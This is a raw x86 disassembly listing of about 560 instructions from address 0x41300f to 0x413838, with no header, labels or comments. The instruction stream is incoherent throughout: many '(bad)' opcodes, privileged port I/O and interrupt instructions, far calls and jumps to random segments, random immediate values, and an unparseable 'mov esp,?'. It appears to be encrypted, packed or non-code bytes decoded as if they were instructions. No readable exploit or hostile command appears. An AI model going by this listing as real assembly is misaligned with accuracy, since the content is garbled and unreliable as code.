  41300f:	lds    esi,FWORD PTR [edi+0x6663a494]
  413015:	cmp    bl,bh
  413017:	jns    0x413031
  413019:	in     al,dx
  41301a:	pop    ds
  41301b:	xor    dl,bh
  41301d:	(bad)  
  41301e:	sub    bh,bl
  413020:	aam    0xb1
  413022:	push   eax
  413023:	mov    dl,0x29
  413025:	test   DWORD PTR [eax+0x4ba59d0a],esp
  41302b:	inc    esp
  41302c:	das    
  41302d:	fwait
  41302e:	les    ebx,FWORD PTR [bp+di+0x1f]
  413032:	in     al,0xc9
  413034:	sti    
  413035:	lea    esi,[edx-0x69]
  413038:	xlat   BYTE PTR ds:[ebx]
  413039:	retf   
  41303a:	sbb    al,0x25
  41303c:	push   eax
  41303d:	sub    DWORD PTR [eax-0x25],edx
  413040:	jl     0x413091
  413042:	(bad)  
  413044:	lods   eax,DWORD PTR ds:[esi]
  413045:	push   esi
  413046:	cmp    edi,DWORD PTR [edx]
  413048:	enter  0x268b,0xdf
  41304c:	inc    esi
  41304d:	lds    esi,FWORD PTR [ecx-0x2f718ae7]
  413053:	xchg   esp,eax
  413054:	fdiv   QWORD PTR [edx+0x42]
  413057:	adc    ebx,DWORD PTR [esi]
  413059:	xchg   esi,eax
  41305a:	cld    
  41305b:	cmp    ch,dh
  41305d:	mov    esi,DWORD PTR [edi-0x17]
  413060:	pop    esi
  413061:	push   eax
  413062:	dec    esi
  413063:	aas    
  413064:	sbb    DWORD PTR [esi-0x4f],0xbcbe1d5d
  41306b:	mov    eax,0x38f7b2ce
  413070:	push   esp
  413071:	out    dx,eax
  413072:	mov    ecx,0xa5272be7
  413077:	adc    dl,BYTE PTR [edx+0x297f46b3]
  41307d:	fnstsw WORD PTR [esi]
  41307f:	(bad)  
  413080:	cmp    DWORD PTR [edx+0x3d],edx
  413083:	test   eax,0x95907628
  413088:	sar    DWORD PTR [eax],0x1e
  41308b:	lahf   
  41308c:	dec    edx
  41308d:	lds    ebx,FWORD PTR [edi-0x2c4245fe]
  413093:	push   ecx
  413094:	test   al,0x8e
  413096:	push   ebp
  413097:	dec    edi
  413098:	mov    edx,0xfdd23422
  41309d:	out    dx,al
  41309e:	js     0x413026
  4130a0:	test   eax,0xe09edc6a
  4130a5:	push   ds
  4130a6:	mov    ebx,0xea47d229
  4130ab:	cmp    esi,DWORD PTR [ebx]
  4130ad:	rol    BYTE PTR [eax],cl
  4130af:	mov    ah,0x16
  4130b1:	int3   
  4130b2:	and    BYTE PTR [eax+0x1f126652],al
  4130b8:	(bad)  
  4130b9:	(bad)  
  4130ba:	xlat   BYTE PTR ds:[ebx]
  4130bb:	push   ecx
  4130bc:	push   ds
  4130bd:	lds    ebx,FWORD PTR ds:0x1a165f1c
  4130c3:	xchg   esi,eax
  4130c4:	call   0xb694:0xfbf73ee9
  4130cb:	adc    edi,DWORD PTR [ecx]
  4130cd:	fld    TBYTE PTR [eax]
  4130cf:	xchg   edx,eax
  4130d0:	mov    cl,al
  4130d2:	ja     0x4130db
  4130d4:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4130d6:	and    esp,DWORD PTR [edi+esi*8]
  4130d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130da:	inc    esp
  4130db:	xchg   esi,eax
  4130dc:	je     0x413128
  4130de:	xchg   esi,eax
  4130df:	inc    ebx
  4130e0:	test   DWORD PTR ds:0x33a95b31,0x16f4985
  4130ea:	(bad)  
  4130eb:	fadd   DWORD PTR [ebp-0x264c37d]
  4130f1:	cmc    
  4130f2:	mov    ss,WORD PTR [edi*4-0x249f78cb]
  4130f9:	mov    bl,0xb0
  4130fb:	xchg   ecx,eax
  4130fc:	push   ebp
  4130fd:	bnd call 0x5578584a
  413103:	push   DWORD PTR [edi+edx*1]
  413106:	(bad)  
  413108:	sbb    cl,BYTE PTR [eax-0x184e30a]
  41310e:	aad    0x2a
  413110:	jmp    0x41313a
  413112:	xor    al,0x1
  413114:	mov    esp,0x70d034e3
  413119:	inc    ebx
  41311a:	sahf   
  41311b:	scas   al,BYTE PTR es:[edi]
  41311c:	fwait
  41311d:	and    BYTE PTR [ebx+0x425abd3c],0x9f
  413124:	jl     0x413118
  413126:	dec    edi
  413127:	dec    edi
  413128:	inc    edx
  413129:	mov    ch,0xbd
  41312b:	mov    bh,0xe3
  41312d:	sbb    dh,BYTE PTR [eax+0x5faf7d32]
  413133:	pop    esi
  413134:	clc    
  413135:	and    al,BYTE PTR [ebx-0x57]
  413138:	je     0x41319b
  41313a:	sbb    eax,0x35da7dec
  41313f:	adc    BYTE PTR ds:0x4d38e296,ah
  413145:	mov    ds:0x52cd654,eax
  41314a:	enter  0x4280,0x12
  41314e:	inc    edi
  41314f:	(bad)  
  413150:	call   0x815bae4
  413155:	mov    DWORD PTR [esi+0x55914f14],ebp
  41315b:	dec    edx
  41315c:	mov    dl,0xc5
  41315e:	sub    edi,DWORD PTR [edi]
  413160:	pop    ebp
  413161:	js     0x4131d8
  413163:	aad    0x41
  413165:	nop
  413166:	daa    
  413167:	stc    
  413168:	sbb    bl,bh
  41316a:	add    ah,BYTE PTR [edx]
  41316c:	test   BYTE PTR [edi-0x25ff5fc4],ah
  413172:	dec    esp
  413173:	mov    ebx,DWORD PTR [edx+edx*8+0x38cdcb1f]
  41317a:	test   DWORD PTR [esp+esi*4-0x71d95e77],ebx
  413181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413182:	int    0xc0
  413184:	mov    bh,0xdd
  413186:	xchg   ecx,eax
  413187:	stc    
  413188:	adc    ch,BYTE PTR [esi]
  41318a:	sub    eax,0x3ad88eb1
  41318f:	rcr    BYTE PTR [ecx-0x53],0xde
  413193:	sub    BYTE PTR [eax],bh
  413195:	mov    ebx,0xfa3127d4
  41319a:	daa    
  41319b:	jmp    0x4b62472
  4131a0:	cmp    bh,bh
  4131a2:	push   ss
  4131a3:	jns    0x4131fd
  4131a5:	dec    ecx
  4131a6:	add    ebx,DWORD PTR [esi-0x61]
  4131a9:	dec    edi
  4131aa:	mov    dh,0xcd
  4131ac:	dec    eax
  4131ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ae:	jo     0x413149
  4131b0:	jge    0x41320d
  4131b2:	std    
  4131b3:	jp     0x413149
  4131b5:	push   edi
  4131b6:	xchg   esp,eax
  4131b7:	ret    0x78a6
  4131ba:	jne    0xc3041f75
  4131c0:	sub    BYTE PTR [esi+0x14f8d9ff],dl
  4131c6:	inc    eax
  4131c7:	call   0xa934:0x8d7002dd
  4131ce:	sbb    ecx,DWORD PTR [ebx+ebp*4-0x30ca3510]
  4131d5:	add    eax,0x617aa973
  4131da:	std    
  4131db:	fs sbb ecx,edx
  4131de:	out    dx,al
  4131df:	sbb    cl,BYTE PTR [ebp-0xc8b3051]
  4131e5:	rcl    BYTE PTR ds:0xe3a004fc,0x3f
  4131ec:	rcl    BYTE PTR [ebx+edi*2+0x1ab40c61],1
  4131f3:	out    dx,al
  4131f4:	mov    ebp,0x6c5cb3e0
  4131f9:	mov    dl,0xed
  4131fb:	sbb    al,0x8
  4131fd:	xchg   edi,eax
  4131fe:	mov    ebp,0x8beb4534
  413203:	into   
  413204:	cs test al,0x24
  413207:	and    BYTE PTR [edx+eiz*4-0x71],ah
  41320b:	xlat   BYTE PTR ds:[ebx]
  41320c:	sar    bl,0xa3
  41320f:	and    ch,0x4f
  413212:	jmp    0xc9d3:0xff30ce0f
  413219:	sub    ah,BYTE PTR [esi]
  41321b:	push   esp
  41321c:	xchg   ebp,eax
  41321d:	ret    
  41321e:	inc    edi
  41321f:	fbstp  TBYTE PTR [ebx+0xa]
  413222:	in     al,dx
  413223:	ja     0x4131ea
  413225:	mov    edx,0x642a20d5
  41322a:	mov    eax,ds:0xac65fc4c
  41322f:	out    dx,eax
  413230:	dec    edx
  413231:	or     BYTE PTR [edx-0x11],ch
  413234:	mov    dl,0xd
  413236:	jge    0x413229
  413238:	xchg   ebp,eax
  413239:	mov    ebx,0x16f5f0d8
  41323e:	xor    ecx,DWORD PTR [edx-0x8]
  413241:	fs mov edi,0xe64ab805
  413247:	in     eax,dx
  413248:	int3   
  413249:	(bad)  
  41324a:	retf   
  41324b:	in     eax,0x63
  41324d:	repnz inc esi
  41324f:	inc    edx
  413250:	pop    ds
  413251:	js     0x4132c7
  413253:	icebp  
  413254:	mov    al,ds:0xe9b6844f
  413259:	xchg   BYTE PTR [ecx],al
  41325b:	je     0x41321e
  41325d:	lods   eax,DWORD PTR ds:[esi]
  41325e:	mov    ecx,0x9735d5af
  413263:	sub    bh,BYTE PTR [edi]
  413265:	hlt    
  413266:	loope  0x413209
  413268:	sbb    al,0x5
  41326a:	fldcw  WORD PTR [ebx-0x7d]
  41326d:	das    
  41326e:	jmp    0x413245
  413270:	inc    edx
  413271:	cli    
  413272:	push   ebx
  413273:	jne    0x4132d3
  413275:	or     eax,0x33cd8625
  41327a:	test   DWORD PTR [ecx-0x5d],ecx
  41327d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41327e:	mov    dl,0xf6
  413280:	mov    ebx,0x65cc3e2a
  413285:	lods   eax,DWORD PTR ds:[esi]
  413286:	xchg   DWORD PTR [ebx*8-0x155f27f4],ebp
  41328d:	add    ch,BYTE PTR [ebp-0x6a82f9b6]
  413293:	aaa    
  413294:	jns    0x41324b
  413296:	mov    ebp,0x57c1d8e6
  41329b:	bound  eax,QWORD PTR [eax]
  41329d:	and    BYTE PTR [edi-0xf],al
  4132a0:	lea    edi,[ebx-0x7fdcaab7]
  4132a6:	mov    ecx,0x8417bdd0
  4132ab:	addr16 daa 
  4132ad:	mov    edx,0xd5257077
  4132b2:	inc    esp
  4132b3:	mov    eax,ds:0xcae53a80
  4132b8:	or     BYTE PTR [edx-0x17c1ea4d],dl
  4132be:	xchg   bl,al
  4132c0:	push   edx
  4132c1:	out    dx,eax
  4132c2:	xor    eax,0x91513921
  4132c7:	push   esi
  4132c8:	js     0x413341
  4132ca:	mov    ecx,0xc2e0386a
  4132cf:	cli    
  4132d0:	test   eax,0x61f461ba
  4132d5:	mov    cl,0x29
  4132d7:	adc    al,0x10
  4132d9:	ins    DWORD PTR es:[edi],dx
  4132da:	xchg   DWORD PTR [esi+0x74],edi
  4132dd:	(bad)  
  4132de:	sub    BYTE PTR [edi+ecx*4-0x7cdd8a73],dl
  4132e5:	cmp    al,0x78
  4132e7:	or     al,0xb4
  4132e9:	mov    DWORD PTR [edx],edx
  4132eb:	aam    0xfc
  4132ed:	mov    ebx,0x959acc7f
  4132f2:	mov    bh,0xe3
  4132f4:	and    al,0x31
  4132f6:	xchg   esp,eax
  4132f7:	mov    eax,ds:0xfe8159f8
  4132fc:	mov    eax,ds:0xb86a8865
  413301:	mov    bl,0x24
  413303:	push   esi
  413304:	push   0x9
  413306:	into   
  413307:	inc    edi
  413308:	(bad)  
  413309:	popa   
  41330a:	(bad)  
  41330c:	imul   esi,DWORD PTR [eax+0x2f],0xb33d61e
  413313:	inc    ebp
  413314:	mov    bh,0x18
  413316:	xchg   ecx,eax
  413317:	daa    
  413318:	pop    edi
  413319:	mov    dl,0xa3
  41331b:	lock mov dh,0xc0
  41331e:	aam    0xcd
  413320:	out    dx,al
  413321:	(bad)  
  413322:	cmp    DWORD PTR [edi],edi
  413324:	call   0x3634:0xf2226c25
  41332b:	in     al,0x69
  41332d:	retf   
  41332e:	mov    eax,0xed6e3d1e
  413333:	fsub   DWORD PTR [eax+0x27]
  413336:	push   ebp
  413337:	(bad)  
  413338:	pop    ebx
  413339:	push   edx
  41333a:	(bad)  
  41333b:	mov    eax,0xfb6da13a
  413340:	loopne 0x41332c
  413342:	push   edi
  413343:	or     al,0x1c
  413345:	in     al,0x34
  413347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413348:	cwde   
  413349:	sbb    DWORD PTR [ebx],ecx
  41334b:	xor    al,0x44
  41334d:	xchg   edi,eax
  41334e:	mov    esp,ebx
  413350:	imul   ebx,DWORD PTR fs:[esi-0x45],0x2ad98d2b
  413358:	jne    0x413337
  41335a:	mov    bl,0x4d
  41335c:	jmp    0x413321
  41335e:	push   ss
  41335f:	jle    0x4133b4
  413361:	ja     0x41338f
  413363:	cmc    
  413364:	int    0x6
  413366:	shl    BYTE PTR [ecx],0x7e
  413369:	inc    esi
  41336a:	inc    ecx
  41336b:	pushf  
  41336c:	leave  
  41336d:	jle    0x4133ea
  41336f:	mov    eax,0xeb98e89d
  413374:	xor    DWORD PTR [eax],edi
  413376:	(bad)  
  413377:	xlat   BYTE PTR ds:[ebx]
  413378:	xor    BYTE PTR [esi],bl
  41337a:	repz aam 0xa
  41337d:	retf   0xc386
  413380:	mov    DWORD PTR [ebx+0xec7cb7a],0x20a26781
  41338a:	pop    esi
  41338b:	push   edx
  41338c:	(bad)  
  41338d:	scas   al,BYTE PTR es:[edi]
  41338e:	and    edx,DWORD PTR [edi]
  413390:	test   DWORD PTR [eax-0x3088c9f],0x3c667444
  41339a:	sbb    esp,eax
  41339c:	jle    0x4133fb
  41339e:	adc    BYTE PTR ds:0x537c7263,ch
  4133a4:	into   
  4133a5:	sub    ax,0xa368
  4133aa:	cdq    
  4133ab:	stc    
  4133ac:	jp     0x4133c8
  4133ae:	dec    ebx
  4133af:	adc    DWORD PTR [edi-0x19613441],edi
  4133b5:	icebp  
  4133b6:	or     bl,dl
  4133b8:	dec    ebx
  4133b9:	jl     0x4133ae
  4133bb:	push   esp
  4133bc:	pop    ss
  4133bd:	(bad)  
  4133be:	aaa    
  4133bf:	or     al,0xe8
  4133c1:	cmc    
  4133c2:	aas    
  4133c3:	fcomp  QWORD PTR [edi+0x5]
  4133c6:	fwait
  4133c7:	shl    esp,cl
  4133c9:	mov    cl,BYTE PTR [ebp+0x58]
  4133cc:	sbb    dl,BYTE PTR [ebx-0x7f]
  4133cf:	mov    ecx,0x585cedc1
  4133d4:	das    
  4133d5:	jl     0x4133a3
  4133d7:	fs cmp BYTE PTR ds:[edi],cl
  4133db:	loopne 0x4133fa
  4133dd:	and    eax,0xd28980e8
  4133e2:	in     al,0x85
  4133e4:	add    esp,edi
  4133e6:	sub    al,0xa
  4133e8:	push   0x642c2d08
  4133ed:	pop    ecx
  4133ee:	push   ebp
  4133ef:	int3   
  4133f0:	aad    0xee
  4133f2:	imul   eax,eax,0x187e98ba
  4133f8:	lea    esi,[ebp+0x74074514]
  4133fe:	daa    
  4133ff:	pop    esi
  413400:	adc    DWORD PTR [ebx+edx*1],ebx
  413403:	bound  ecx,QWORD PTR [ebx+0x24]
  413406:	in     eax,0xd
  413408:	adc    BYTE PTR [ecx+0x7f],bh
  41340b:	mov    ds:0x941d0623,eax
  413410:	retf   
  413411:	ss pop ss
  413413:	iret   
  413414:	(bad)  
  413415:	push   es
  413416:	ror    BYTE PTR [ebx],0x38
  413419:	shl    DWORD PTR [esi+0x29],cl
  41341c:	jecxz  0x413410
  41341e:	imul   ecx,DWORD PTR [edx+eax*1+0x629f7ab6],0xf9aad9eb
  413429:	ror    ecx,1
  41342b:	cmp    esp,esp
  41342d:	popf   
  41342e:	xor    cl,ch
  413430:	dec    ebp
  413431:	cmp    eax,0xe7eda170
  413436:	or     eax,0x2721b510
  41343b:	(bad)  
  41343c:	or     ch,bl
  41343e:	pushf  
  41343f:	push   0xfef91f03
  413444:	ja     0x413444
  413446:	cwde   
  413447:	std    
  413448:	mov    al,ds:0xe697dd25
  41344d:	mov    bh,0x8b
  41344f:	xor    ebx,ebx
  413451:	inc    esi
  413452:	stc    
  413453:	(bad)  
  413454:	xor    edi,DWORD PTR [esp+edx*1]
  413457:	xor    esp,DWORD PTR [eax-0x359d07e7]
  41345d:	cs stc 
  41345f:	or     DWORD PTR [edx-0x7e3203b4],0x132a2c57
  413469:	inc    ecx
  41346a:	test   DWORD PTR [ecx],0xc234cc31
  413470:	inc    ecx
  413471:	adc    BYTE PTR [esi+edi*4+0x61],bl
  413475:	cmp    edx,DWORD PTR [eax-0x406f37e8]
  41347b:	pop    esp
  41347c:	mov    es,WORD PTR [esi]
  41347e:	rol    DWORD PTR ds:0x18d80c0e,0xc3
  413485:	mov    DWORD PTR [ecx-0x42],esi
  413488:	mov    eax,0xdea54750
  41348d:	stos   BYTE PTR es:[edi],al
  41348e:	add    ecx,esi
  413490:	frstor [ecx+0x6d111b7c]
  413496:	mov    BYTE PTR [eax],cl
  413498:	pop    ebp
  413499:	cli    
  41349a:	dec    edx
  41349b:	mov    ds:0x2417d8f8,eax
  4134a0:	pop    ecx
  4134a1:	fmul   QWORD PTR [ecx+edi*1-0x4]
  4134a5:	mov    edx,0x8e66f48b
  4134aa:	data16 mov ds:0x324388db,al
  4134b0:	pop    ds
  4134b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134b2:	in     al,dx
  4134b3:	mov    ds:0xf2739baf,eax
  4134b8:	int3   
  4134b9:	jp     0x4134a1
  4134bb:	sbb    edi,esp
  4134bd:	xor    eax,0x3de77fea
  4134c2:	jl     0x4134d0
  4134c4:	pop    edx
  4134c5:	inc    ebp
  4134c6:	imul   ebx,edi,0x585b08f6
  4134cc:	jg     0x4134be
  4134ce:	dec    ebp
  4134cf:	int    0x6
  4134d1:	or     DWORD PTR [ebx],edi
  4134d3:	or     eax,0x3498cfb5
  4134d8:	mov    ebx,ebx
  4134da:	pop    ds
  4134db:	push   0x8e9ece77
  4134e0:	mov    dl,BYTE PTR [edx-0x6e]
  4134e3:	test   DWORD PTR [ebx],esp
  4134e5:	jb     0x4134e4
  4134e7:	cld    
  4134e8:	(bad)  
  4134e9:	pop    ecx
  4134ea:	xor    cl,dh
  4134ec:	adc    eax,0xa7efeec4
  4134f1:	lea    esi,[eax+eiz*4]
  4134f4:	xor    DWORD PTR [eax],0x6b168961
  4134fa:	lods   al,BYTE PTR ds:[esi]
  4134fb:	mov    eax,esi
  4134fd:	ficom  DWORD PTR [eax-0x58]
  413500:	in     eax,dx
  413501:	cwde   
  413502:	xchg   esp,eax
  413503:	movd   mm6,DWORD PTR [ecx-0x5f]
  413507:	xor    eax,0x99b34a17
  41350c:	jns    0x41355c
  41350e:	in     al,0xb6
  413510:	push   0xffffffac
  413512:	loop   0x4134ea
  413514:	daa    
  413515:	sub    DWORD PTR [edx],eax
  413517:	xchg   ecx,eax
  413518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413519:	mov    dl,0xf8
  41351b:	imul   esp,DWORD PTR [ecx-0x7daf766f],0xdad07ebe
  413525:	jnp    0x4134ad
  413527:	ss aad 0xbc
  41352a:	xchg   esp,ebp
  41352c:	int3   
  41352d:	xor    bl,BYTE PTR [edx-0x3fed2c6f]
  413533:	and    ah,dl
  413535:	fild   DWORD PTR [edx+0x5dcd7df0]
  41353b:	cmp    eax,0x9724fb0
  413540:	mov    DWORD PTR [ecx],ebx
  413542:	call   0x97f8:0x29dda67c
  413549:	pop    ecx
  41354a:	std    
  41354b:	out    dx,eax
  41354c:	cmp    al,0x2c
  41354e:	lods   eax,DWORD PTR ds:[esi]
  41354f:	mov    esi,0xfa1fed8d
  413554:	adc    ebx,0xc158b88e
  41355a:	jns    0x4135d3
  41355c:	xchg   esi,eax
  41355d:	add    ch,BYTE PTR [edi+edx*1-0x67]
  413561:	add    cl,BYTE PTR [ecx]
  413563:	fnstcw WORD PTR [esi-0x5f]
  413566:	sub    al,0x6c
  413568:	xor    ebp,DWORD PTR [ebx+0x43]
  41356b:	adc    eax,0x66d9a665
  413570:	clc    
  413571:	push   esp
  413572:	lds    esi,FWORD PTR fs:[edi+0x5ad2278d]
  413579:	or     eax,0xa3253a98
  41357e:	xlat   BYTE PTR ds:[ebx]
  41357f:	cdq    
  413580:	pop    ebx
  413581:	sub    eax,0xe205be3b
  413586:	add    al,BYTE PTR [ebx-0x48]
  413589:	xor    BYTE PTR [ecx+0x43],bh
  41358c:	(bad)  
  41358d:	lea    eax,[ebp+0x5c]
  413590:	or     BYTE PTR [esi-0x15],cl
  413593:	inc    edi
  413594:	scas   eax,DWORD PTR es:[edi]
  413595:	dec    ecx
  413596:	aas    
  413597:	xchg   edi,eax
  413598:	dec    esp
  413599:	into   
  41359a:	sub    DWORD PTR [eax+0x53],eax
  41359d:	retf   
  41359e:	xchg   edi,eax
  41359f:	mov    al,0x40
  4135a1:	add    al,0x76
  4135a3:	dec    ebx
  4135a4:	mov    esp,0x76ba36de
  4135a9:	jmp    0x413604
  4135ab:	dec    esi
  4135ac:	mov    eax,cs:0x7abb61bc
  4135b2:	jae    0x4135a1
  4135b4:	std    
  4135b5:	xor    bh,ch
  4135b7:	enter  0x1532,0x1
  4135bb:	pop    edx
  4135bc:	js     0x41358e
  4135be:	imul   edx,edx,0xc06599d1
  4135c4:	fmul   DWORD PTR [ebp-0x68]
  4135c7:	mov    edx,DWORD PTR [edx-0x6dafdad4]
  4135cd:	sti    
  4135ce:	data16 (bad) 
  4135d0:	repnz xchg ebp,eax
  4135d2:	lock dec edi
  4135d4:	jmp    0x17488c
  4135d9:	cld    
  4135da:	xor    BYTE PTR [ecx+0x31ddb950],dh
  4135e0:	call   0xad58d619
  4135e5:	lea    edx,[ecx-0xdea5aa5]
  4135eb:	add    BYTE PTR [esi-0x9],bh
  4135ee:	xchg   ebp,eax
  4135ef:	es jge 0x41359f
  4135f2:	test   al,cl
  4135f4:	jl     0x413625
  4135f6:	add    BYTE PTR [edi],al
  4135f8:	(bad)  
  4135f9:	fcmovne st,st(0)
  4135fb:	mov    bl,0x3
  4135fd:	(bad)  
  4135fe:	addr16 jp 0x413633
  413601:	dec    ecx
  413602:	(bad)  
  413603:	push   cs
  413604:	cli    
  413605:	push   es
  413606:	sub    al,0x62
  413608:	aad    0xb0
  41360a:	inc    ebp
  41360b:	hlt    
  41360c:	sahf   
  41360d:	jg     0x4135d9
  41360f:	loope  0x4135f2
  413611:	cwde   
  413612:	push   ss
  413613:	push   ebx
  413614:	retf   0x6669
  413617:	mov    ds:0xc66a5504,eax
  41361c:	fwait
  41361d:	pop    ebx
  41361e:	in     al,dx
  41361f:	sbb    DWORD PTR [ecx-0x6ea0f495],0xffffffef
  413626:	dec    DWORD PTR [ebp-0x9e84443]
  41362c:	xchg   ebx,eax
  41362d:	dec    esi
  41362e:	pop    edi
  41362f:	pop    ds
  413630:	addr16 out 0xd3,eax
  413633:	loopne 0x413645
  413635:	shr    DWORD PTR fs:[edx-0x30661766],1
  41363c:	mov    ebx,ecx
  41363e:	xchg   ecx,eax
  41363f:	mov    ecx,0x702aece5
  413644:	push   ecx
  413645:	scas   al,BYTE PTR es:[edi]
  413646:	test   al,0x8e
  413648:	push   0x30ad2ba
  41364d:	xor    al,0xf5
  41364f:	jo     0x413601
  413651:	neg    BYTE PTR [ecx]
  413653:	test   DWORD PTR [edi+0x79],edi
  413656:	pop    edi
  413657:	pop    edi
  413658:	inc    edx
  413659:	or     ecx,DWORD PTR [esi-0x60ce3f41]
  41365f:	rol    BYTE PTR [edx-0x1ae94ae],0x92
  413666:	jle    0x413666
  413668:	mov    dh,al
  41366a:	ins    DWORD PTR es:[edi],dx
  41366b:	not    DWORD PTR [ebx-0x5c1aa572]
  413671:	and    eax,0xf7cb2398
  413676:	pop    ebp
  413677:	push   ecx
  413678:	sar    ah,cl
  41367a:	(bad)  
  41367b:	sbb    DWORD PTR [ebx],eax
  41367d:	xchg   edx,eax
  41367e:	stos   DWORD PTR es:[edi],eax
  41367f:	sub    eax,DWORD PTR [ecx]
  413681:	into   
  413682:	cs push ss
  413684:	mov    bl,0x97
  413686:	sub    BYTE PTR [ebp+0x7bf3a0c2],dl
  41368c:	mov    ch,0x77
  41368e:	nop
  41368f:	sbb    ecx,ebp
  413691:	mov    edx,0x52ef38b0
  413696:	jg     0x413676
  413698:	hlt    
  413699:	ret    0xe6b7
  41369c:	test   al,0x78
  41369e:	scas   eax,DWORD PTR es:[edi]
  41369f:	pop    ecx
  4136a0:	mov    ebp,0x61d584a1
  4136a5:	leave  
  4136a6:	inc    ebp
  4136a7:	mov    ch,0x23
  4136a9:	fcomp  st(2)
  4136ab:	into   
  4136ac:	push   ss
  4136ad:	into   
  4136ae:	push   ebp
  4136af:	loopne 0x4136f1
  4136b1:	clc    
  4136b2:	adc    ch,BYTE PTR [ecx]
  4136b4:	sar    DWORD PTR [eax],0xa8
  4136b7:	mov    ebp,DWORD PTR [ebp+0x53]
  4136ba:	out    dx,al
  4136bb:	rol    DWORD PTR [esi-0x7c33965a],1
  4136c1:	jge    0x4136cd
  4136c3:	push   edi
  4136c4:	adc    eax,0xc0a42158
  4136c9:	pop    es
  4136ca:	cmp    al,0x61
  4136cc:	mov    edi,0xc83b0f2e
  4136d1:	sbb    edx,DWORD PTR [eax-0x390232c3]
  4136d7:	pushf  
  4136d8:	dec    esi
  4136d9:	mov    esp,0xcd18672e
  4136de:	dec    esi
  4136df:	lahf   
  4136e0:	sbb    eax,0x877e11a1
  4136e5:	adc    al,0x2f
  4136e7:	sar    DWORD PTR [esi-0x102af4d7],0x26
  4136ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136ef:	loope  0x4136db
  4136f1:	push   0x62
  4136f3:	inc    esi
  4136f4:	push   ecx
  4136f6:	mov    esi,0xb7fc2ec5
  4136fb:	dec    bh
  4136fd:	bound  esi,QWORD PTR [edi+0x64]
  413700:	add    edx,DWORD PTR [edi+0x2a454bb2]
  413706:	adc    esi,esi
  413708:	scas   al,BYTE PTR es:[edi]
  413709:	cdq    
  41370a:	mov    esp,?
  41370c:	pop    ss
  41370d:	leave  
  41370e:	shl    ah,1
  413710:	xchg   esp,eax
  413711:	setns  dh
  413714:	mov    edi,0x96af431d
  413719:	pop    edi
  41371a:	nop
  41371b:	ja     0x413728
  41371d:	pop    es
  41371e:	into   
  41371f:	or     eax,0x71eaed3e
  413724:	test   BYTE PTR [esi+eax*2+0x3ce5fd4e],0xa3
  41372c:	aad    0xe0
  41372e:	stos   BYTE PTR es:[edi],al
  41372f:	aad    0xf7
  413731:	inc    edx
  413732:	in     eax,dx
  413733:	clc    
  413734:	fsub   QWORD PTR [eax+0x2ad205e2]
  41373a:	icebp  
  41373b:	pop    ss
  41373c:	adc    eax,0x8dda4896
  413741:	jp     0x413719
  413743:	lods   al,BYTE PTR ds:[esi]
  413744:	ins    DWORD PTR es:[edi],dx
  413745:	and    al,0x40
  413747:	(bad)  
  413748:	div    BYTE PTR [edx+0x1deef789]
  41374e:	jmp    0xb29c:0x41c335ce
  413755:	inc    eax
  413756:	add    ch,BYTE PTR [edi]
  413758:	and    dl,BYTE PTR [ecx-0x6a404040]
  41375e:	cmp    DWORD PTR [edi],edi
  413760:	mov    dl,0x23
  413762:	cli    
  413763:	or     BYTE PTR [ebp-0x64],bh
  413766:	icebp  
  413767:	inc    esi
  413768:	inc    eax
  413769:	mov    eax,0x2f280840
  41376e:	jle    0x41372b
  413770:	adc    edi,eax
  413772:	mov    gs,edx
  413774:	jns    0x413789
  413776:	cmc    
  413777:	ins    BYTE PTR es:[edi],dx
  413778:	nop
  413779:	pop    edx
  41377a:	sbb    dh,bh
  41377c:	adc    bl,dl
  41377e:	sbb    al,0x54
  413780:	mov    al,ds:0x48c0e1ad
  413785:	addr16 jmp 0xa1ca:0x5a7c270
  41378d:	ja     0x41377a
  41378f:	xor    al,0x76
  413791:	gs xchg edi,eax
  413793:	mov    ah,0x4e
  413795:	inc    edi
  413796:	or     DWORD PTR [ebx+esi*1+0x32a790f4],ebx
  41379d:	lea    ebp,[edi-0x4d]
  4137a0:	fist   WORD PTR [ebp-0x758aef7]
  4137a6:	lds    edx,FWORD PTR [ebx+0x56067f51]
  4137ac:	or     ah,BYTE PTR [ebx+ecx*1-0x27]
  4137b0:	cmp    cl,BYTE PTR [esp+edi*1-0x3d6acbe4]
  4137b7:	sub    ebp,DWORD PTR [ebx+esi*1]
  4137ba:	into   
  4137bb:	xor    BYTE PTR [edx+0x3f],dl
  4137be:	sbb    BYTE PTR [ebx],bl
  4137c0:	ret    
  4137c1:	std    
  4137c2:	js     0x41376d
  4137c4:	rcr    BYTE PTR [ebx+0x1398413b],cl
  4137ca:	inc    esi
  4137cb:	out    0x98,al
  4137cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ce:	pop    esi
  4137cf:	mov    bh,0x28
  4137d1:	or     edx,edi
  4137d3:	xor    eax,0x687dfee9
  4137d8:	mov    ch,0x35
  4137da:	mov    dh,0xed
  4137dc:	push   cs
  4137dd:	xor    DWORD PTR [ebx],edi
  4137df:	and    BYTE PTR [ebp+0x3e787637],0xb8
  4137e6:	loopne 0x41376d
  4137e8:	jecxz  0x41379d
  4137ea:	ror    BYTE PTR [edi-0x43],cl
  4137ed:	jnp    0x413817
  4137ef:	cmp    esp,DWORD PTR [ecx+0x43c33e08]
  4137f5:	add    esi,esi
  4137f7:	test   esi,ebp
  4137f9:	add    bh,bl
  4137fb:	add    BYTE PTR [ebx-0x6b],bl
  4137fe:	cmc    
  4137ff:	add    edx,DWORD PTR [edi-0x76]
  413802:	ret    0xaffe
  413805:	add    DWORD PTR [edi+ebx*1],edx
  413808:	or     eax,0xd386959
  41380d:	or     DWORD PTR [edx+0x45],eax
  413810:	sub    edi,edx
  413812:	xchg   DWORD PTR [ebp+edi*4-0x691abf4e],edx
  413819:	add    eax,0xbbb0867e
  41381e:	out    dx,eax
  41381f:	dec    edi
  413820:	jmp    0x5fc7e4ec
  413825:	neg    esi
  413827:	xchg   ecx,eax
  413828:	imul   ecx,DWORD PTR [eax-0x14be82db],0x3babad5f
  413832:	and    BYTE PTR [esi],bh
  413834:	pop    eax
  413835:	lsl    esp,sp
  413838:	pop    eax
